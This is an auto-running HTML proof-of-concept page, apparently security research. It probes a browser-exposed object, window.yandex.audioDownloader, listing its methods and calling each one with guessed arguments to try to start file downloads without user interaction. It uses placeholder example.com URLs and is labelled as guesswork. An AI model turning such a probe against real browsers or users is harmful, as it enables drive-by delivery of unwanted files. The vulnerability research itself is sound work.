<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"utf-8\" />\n  <title>DJINI PoC - yandex.audioDownloader method discovery</title>\n  <style>\n    body { font-family: sans-serif; padding: 16px; }\n    h1 { margin: 0 0 8px 0; }\n    pre { white-space: pre-wrap; word-break: break-word; background: #111; color: #0f0; padding: 12px; border-radius: 8px; }\n  </style>\n</head>\n<body>\n  <h1>DJINI PoC</h1>\n  <div>Target: <code>window.yandex.audioDownloader</code> (auto-run)</div>\n  <div>TS: <span id=\"ts\"></span></div>\n  <pre id=\"out\">Running...</pre>\n\n<script>\n(function(){\n  document.getElementById('ts').textContent = String(Date.now());\n\n  function out(s){\n    const el = document.getElementById('out');\n    el.textContent += s + \"\\n\";\n  }\n  function safe(v){\n    try{\n      if (v === undefined) return 'undefined';\n      if (v === null) return 'null';\n      if (typeof v === 'string') return JSON.stringify(v);\n      if (typeof v === 'number' || typeof v === 'boolean') return String(v);\n      if (typeof v === 'function') return '[function '+(v.name||'anonymous')+']';\n      return String(v);\n    }catch(e){ return '[unprintable:'+e+']'; }\n  }\n  function j(o){\n    try { return JSON.stringify(o); } catch(e){ return '[json_fail:'+e+']'; }\n  }\n  function ownKeys(o){\n    try { return Reflect.ownKeys(o); } catch(e){ return ['<ownKeys error '+e+'>']; }\n  }\n\n  // Reset output\n  document.getElementById('out').textContent = '';\n\n  out('--- window.yandex ---');\n  let y;\n  try { y = window.yandex; } catch(e){ out('ERROR reading window.yandex: '+e); y = undefined; }\n  out('typeof window.yandex = ' + (typeof y) + ' ' + safe(y));\n  if (!y) {\n    out('No window.yandex present; stopping.');\n    alert('No window.yandex present');\n    return;\n  }\n\n  out('ownKeys(window.yandex) = ' + j(ownKeys(y).slice(0, 80)));\n\n  out('\\n--- audioDownloader descriptor ---');\n  let desc;\n  try { desc = Object.getOwnPropertyDescriptor(y, 'audioDownloader'); } catch(e){ desc = {error:String(e)}; }\n  out('descriptor = ' + j(desc && {\n    has: !!desc,\n    enumerable: desc ? !!desc.enumerable : null,\n    configurable: desc ? !!desc.configurable : null,\n    writable: desc && ('writable' in desc) ? !!desc.writable : null,\n    hasValue: desc ? ('value' in desc) : null,\n    valueType: (desc && 'value' in desc) ? (typeof desc.value) : null,\n    hasGet: !!(desc && typeof desc.get === 'function'),\n    hasSet: !!(desc && typeof desc.set === 'function')\n  }));\n\n  out('\\n--- window.yandex.audioDownloader ---');\n  let ad;\n  try { ad = y.audioDownloader; } catch(e){ out('ERROR reading y.audioDownloader: '+e); ad = undefined; }\n  out('typeof y.audioDownloader = ' + (typeof ad) + ' ' + safe(ad));\n\n  if (!ad) {\n    out('\\nRESULT: audioDownloader is not bound (undefined/null) in this context.');\n    alert('audioDownloader is not bound here (undefined/null).');\n    return;\n  }\n\n  // Enumerate method surface\n  out('\\n--- audioDownloader keys ---');\n  const keys = ownKeys(ad);\n  out('ownKeys(audioDownloader) = ' + j(keys.slice(0, 200)));\n\n  // Build candidate method list\n  const fnNames = [];\n  for (const k of keys) {\n    try {\n      if (typeof ad[k] === 'function') fnNames.push(String(k));\n    } catch(e) {}\n  }\n  out('function keys = ' + j(fnNames));\n\n  // Attempt non-interactive download triggers (best-effort)\n  // NOTE: these are guesses until we know real signatures; we log exceptions.\n  const testUrl = 'https://example.com/audio.mp3';\n  const altUrl = 'https://example.com/poc.txt';\n  const fileName = 'djini_poc_audio.mp3';\n  const cd = 'attachment; filename=\"'+fileName+'\"';\n  const mime = 'audio/mpeg';\n\n  // Common signature sets to try\n  const argSets = [\n    [testUrl],\n    [testUrl, fileName],\n    [testUrl, fileName, mime],\n    [testUrl, cd, mime],\n    [testUrl, cd, mime, fileName],\n    [altUrl, cd, 'text/plain', 'djini_poc.txt'],\n    [{url:testUrl, filename:fileName, mime:mime}],\n    [{url:testUrl, contentDisposition:cd, mimeType:mime}],\n  ];\n\n  // Method name candidates (if actual methods exist, they will be in fnNames too)\n  const likely = [\n    'download', 'downloadAudio', 'downloadFile', 'save', 'saveFile',\n    'start', 'startDownload', 'enqueue', 'add', 'request', 'fetch',\n    'saveToFile', 'saveFromUrl', 'saveUrl'\n  ];\n\n  const callTargets = [];\n  for (const name of fnNames) callTargets.push(name);\n  for (const name of likely) if (!callTargets.includes(name)) callTargets.push(name);\n\n  out('\\n--- call attempts (non-interactive) ---');\n  let anySuccess = false;\n  for (const m of callTargets) {\n    let f;\n    try { f = ad[m]; } catch(e) { continue; }\n    if (typeof f !== 'function') continue;\n\n    for (let i=0;i<argSets.length;i++) {\n      const args = argSets[i];\n      try {\n        const r = f.apply(ad, args);\n        out('[OK] audioDownloader.'+m+' args#'+i+' returned: '+safe(r));\n        anySuccess = true;\n      } catch(e) {\n        out('[EX] audioDownloader.'+m+' args#'+i+' threw: '+e);\n      }\n    }\n  }\n\n  out('\\nRESULT anySuccess=' + anySuccess);\n  alert('audioDownloader probe done. anySuccess=' + anySuccess + '. Check page output.');\n})();\n</script>\n</body>\n</html>
